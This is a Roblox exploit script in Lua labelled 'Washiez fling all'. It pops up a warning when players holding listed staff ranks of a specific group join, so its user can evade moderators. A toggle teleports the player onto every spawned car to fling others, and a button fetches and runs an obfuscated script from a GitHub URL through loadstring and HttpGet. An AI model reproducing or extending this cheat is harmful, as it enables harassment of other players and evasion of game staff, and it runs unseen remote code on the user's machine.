local groupId = 10261023
local rankNames = {"Junior Director",
    "Senior Director", "Head Director", "Corporate Intern", "Junior Corporate",
    "Senior Corporate", "Head Corporate", "Chief Human Resources Officer",
    "Chief Public Relations Officer", "Chief Operating Officer",
    "Chief Administrative Officer", "Developer", "Vice Chairman", "Chairman"
}

local function createNotificationGui(message)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NotificationGui"
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.3, 0, 0.2, 0)
    frame.Position = UDim2.new(0.35, 0, 0.4, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = screenGui

    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 0.7, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundColor3 = Color3.new(1, 0, 0)
    textLabel.TextColor3 = Color3.new(1, 1, 1)
    textLabel.TextScaled = true
    textLabel.Text = message
    textLabel.Parent = frame

    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.4, 0, 0.2, 0)
    button.Position = UDim2.new(0.3, 0, 0.75, 0)
    button.BackgroundColor3 = Color3.new(0, 1, 0)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.TextScaled = true
    button.Text = "OK"
    button.Parent = frame

    button.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    delay(8, function()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
    end)
end

local function handlePlayerEvent(player)
    createNotificationGui(player.Name .. " has joined the game.")

    local success, rank = pcall(function()
        return player:GetRoleInGroup(groupId)
    end)

    if success then
        for _, rankName in ipairs(rankNames) do
            if rankName == rank then
                createNotificationGui("WARNING: A " .. rankName .. " has joined the game. WATCH OUT!")
                break
            end
        end
    end
end

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Washiez fling all", "DarkTheme")
local Tab = Window:NewTab("Main Page")
local Section = Tab:NewSection("Main Page")

local function toggleFling(state)
    _G.on = state
    while _G.on do
        task.wait(0.1)
        for _, v in pairs(workspace.SpawnedCars:GetChildren()) do
            if not _G.on then break end
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.PrimaryPart.CFrame
            task.wait(0.1)
        end
    end
end

Section:NewToggle("Toggle Fling", "ToglInfo", function(state)
    if state then
        spawn(function()
            toggleFling(true)
        end)
    else
        _G.on = false
    end
end)

Section:NewButton("Fling script", "ButtonInfo", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
end)

game.Players.PlayerAdded:Connect(function(player)
    handlePlayerEvent(player)
end)

game.Players.PlayerRemoving:Connect(function(player)
    handlePlayerEvent(player)
end)
